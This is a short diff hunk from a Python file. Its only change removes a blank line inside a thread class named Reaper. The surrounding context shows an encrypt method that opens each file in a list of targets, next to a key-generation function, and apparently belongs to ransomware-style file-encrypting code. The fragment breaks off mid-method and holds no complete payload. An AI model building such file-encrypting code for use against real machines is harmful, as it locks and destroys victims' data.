@@ -17,7 +17,6 @@ def generate_key():
 
 
 class Reaper(Thread):
-
     def encrypt(self, key, targets):
         for file in targets:
             with open(file, "rb") as target_file:
